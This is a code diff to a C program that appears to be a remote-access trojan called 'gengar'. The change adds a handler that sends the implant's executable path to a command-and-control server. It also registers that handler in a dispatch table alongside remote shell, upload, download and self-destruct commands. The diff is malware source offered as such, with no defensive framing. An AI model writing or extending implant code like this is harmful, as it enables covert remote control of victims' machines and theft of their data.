@@ -322,10 +322,28 @@ cleanup:
         log_info("Successfully downloaded the file.");
 }
 
+void handle_get_gengar_path()
+{
+    unsigned int gengar_path_len = 0;
+    char gengar_path[MAX_PATH];
+
+    gengar_path_len = GetModuleFileName(NULL, gengar_path, MAX_PATH);
+    if (cnc_send(&gengar_path_len, sizeof(gengar_path_len)) != sizeof(gengar_path_len))
+    {
+        log_error("Failed to send the path length.");
+        return;
+    }
+    if (cnc_send(gengar_path, gengar_path_len) != gengar_path_len)
+    {
+        log_error("Failed to send the path.");
+        return;
+    }
+}
+
 void listen_for_cmds()
 {
     struct cmd cmd = {};
-    void (*cmd_type_handler[])() = {handle_echo, handle_shell, handle_msgbox, handle_suicide, handle_upload_file, handle_download_file};
+    void (*cmd_type_handler[])() = {handle_echo, handle_shell, handle_msgbox, handle_suicide, handle_upload_file, handle_download_file, handle_get_gengar_path};
 
     while (TRUE)
     {
